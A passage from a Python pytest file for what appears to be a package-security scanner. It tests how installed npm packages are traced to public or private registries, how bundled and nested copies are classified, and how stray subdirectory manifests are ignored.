    shared.write_text("@corp:registry=https://npm.corp.example/\n")
    (tmp_path / ".npmrc").symlink_to(shared)
    assert [(p.name, p.from_public_registry) for p in lang.detect_installed_packages(tmp_path)] == [("@corp/lib", False)]


def test_an_unrecorded_nested_copy_follows_the_configured_registry(lang: NodeLanguage, tmp_path: Path,
                                                                   monkeypatch) -> None:
    """A copy the lock does not record is judged by the configured registries, so under a
    private default registry it is scored on its source alone beside a public copy."""
    from packagealert.languages import registry
    from packagealert.scoring import copy_scored_locally

    monkeypatch.delenv("npm_config_registry", raising=False)
    monkeypatch.setattr(_node, "_user_npmrc", lambda: tmp_path / "no-user-npmrc")
    registry.load()
    nm = tmp_path / "node_modules"
    for rel, name in (("ms", "ms"), ("a", "a"), ("a/node_modules/ms", "ms")):
        (nm / rel).mkdir(parents=True)
        (nm / rel / "package.json").write_text(json.dumps({"name": name, "version": "1.0.0"}))
    (tmp_path / ".npmrc").write_text("registry=https://npm.corp.example/\n")
    (nm / ".package-lock.json").write_text(json.dumps({"lockfileVersion": 3, "packages": {
        "node_modules/ms": {"version": "1.0.0", "resolved": "https://registry.npmjs.org/ms/-/ms-1.0.0.tgz"}}}))
    copies = {str(d.relative_to(nm.resolve())): copy_scored_locally("npm", "ms", d)
              for d in lang.resolve_package_dir("ms", tmp_path, None, "1.0.0")}
    assert copies == {"ms": False, "a/node_modules/ms": True}
    assert {p.name: p.from_public_registry for p in lang.detect_installed_packages(tmp_path)}["ms"] is True


def test_a_url_less_bundle_takes_its_public_containers_verdict(lang: NodeLanguage, tmp_path: Path) -> None:
    """Under a private default registry, a bundled entry with no resolved URL shipped in a
    public package's tarball is public with it: the configured registry says nothing about
    it. Its own non-registry version still makes it local."""
    reg = "https://registry.npmjs.org/"
    public = _node.package_lock_provenance({
        "node_modules/pub": {"version": "1.0.0", "resolved": reg + "pub/-/pub-1.0.0.tgz"},
        "node_modules/pub/node_modules/child": {"version": "2.0.0", "inBundle": True},
        "node_modules/pub/node_modules/child/node_modules/grand": {"version": "3.0.0", "inBundle": True},
        "node_modules/pub/node_modules/vendored": {"version": "file:vendored", "inBundle": True},
    }, ("https://npm.corp.example/", {}))
    assert public == {"node_modules/pub": True, "node_modules/pub/node_modules/child": True,
                      "node_modules/pub/node_modules/child/node_modules/grand": True,
                      "node_modules/pub/node_modules/vendored": False}


def test_post_install_scan_ignores_a_packages_own_sub_entry_manifests(tmp_path, monkeypatch):
    """A manifest a package ships in a subdirectory of its own (dom-helpers/activeElement,
    which can declare any name) is not an installed package; a scoped package is (#110)."""
    from packagealert.sandbox.runner import _collect_new_packages

    monkeypatch.delenv("npm_config_registry", raising=False)
    nm = tmp_path / "node_modules"
    for rel, name, version in (
            ("dom-helpers", "dom-helpers", "5.2.1"),
            ("dom-helpers/activeElement", "evilpkg", "6.6.6"),
            ("@babel/core", "@babel/core", "7.0.0"),
            ("@babel/core/lib/sub", "evil-scoped-sub", "1.0.0"),
            (".cache/x", "cached", "1.0.0"),
            ("a", "a", "1.0.0"),
            ("a/node_modules/b", "b", "1.0.0"),
            ("a/node_modules/b/esm", "evil-nested-sub", "1.0.0"),
    ):
        (nm / rel).mkdir(parents=True)
        (nm / rel / "package.json").write_text(json.dumps({"name": name, "version": version}))
    found = _collect_new_packages([nm], {}, "npm", non_public=set())
    assert sorted((name, version) for _eco, name, version, _root in found) == [
        ("@babel/core", "7.0.0"), ("a", "1.0.0"), ("b", "1.0.0"), ("dom-helpers", "5.2.1")]
    assert sorted((p.name, p.version) for p in NodeLanguage().detect_installed_packages(tmp_path)) == sorted(
        (name, version) for _eco, name, version, _root in found)


@pytest.mark.parametrize(("rel", "depth"), [
    ("a/package.json", 1),
    ("@s/a/package.json", 1),
    ("a/node_modules/@t/b/package.json", 2),
    ("a/sub/package.json", 0),
    ("@s/package.json", 0),
    (".cache/x/package.json", 0),
    ("@s/a/lib/package.json", 0),
])
def test_manifest_depth(rel, depth):
    assert _node._manifest_depth(Path(rel)) == depth
